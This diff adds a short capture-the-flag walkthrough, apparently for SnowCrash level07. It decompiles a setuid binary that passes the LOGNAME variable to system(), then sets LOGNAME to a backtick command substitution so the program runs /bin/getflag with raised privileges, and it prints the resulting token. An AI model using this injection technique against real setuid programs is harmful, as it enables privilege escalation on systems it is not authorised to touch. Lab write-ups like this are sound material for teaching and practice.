@@ -1,0 +1,26 @@
+List home file
+	-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+
+We try ./level07
+	-> level07
+	-> nothing as is
+
+Copy scp -P 4242 level07@10.11.200.52:~/level07 .
+	NSA reverse tool (the best and free) Ghidra : https://ghidra-sre.org/
+	/*
+		local_18 = getegid();
+		local_14 = geteuid();
+		setresgid(local_18,local_18,local_18);
+		setresuid(local_14,local_14,local_14);
+		local_1c = (char *)0x0;
+		pcVar1 = getenv("LOGNAME");
+		asprintf(&local_1c,"/bin/echo %s ",pcVar1);
+		iVar2 = system(local_1c);
+	*/
+	like leve03 setresuid, it will execute system as flag07
+
+We have to change the LOGNAME variable
+
+level07@SnowCrash:~$ export LOGNAME='`/bin/getflag`'
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
